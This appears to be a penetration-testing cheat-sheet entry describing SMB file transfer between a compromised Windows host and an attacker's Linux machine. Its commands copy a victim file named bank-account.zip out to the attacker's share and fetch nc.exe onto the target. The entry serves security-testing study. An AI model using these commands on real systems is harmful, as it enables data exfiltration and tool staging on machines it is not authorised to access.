---
title: |
  File Transfers - Windows to Linux - SMB
description: |
  (Linux) Setup smb share with impacket's smbserver:

  	./smbserver.py test .

  (Windows) Copy to smb share:

  	net view \\<kali-ip>

  	copy <file> \\<kali-ip>\\test
    
  	Ex. copy C:\bank-account.zip \\10.11.0.105\share\
    
  	Ex. copy \\10.11.0.105\share\nc.exe .

command: |
  See commands.
items:
  - Shell
  - Username
  - Password
OS:
  - Windows
  - Linux
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
  - https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/
---
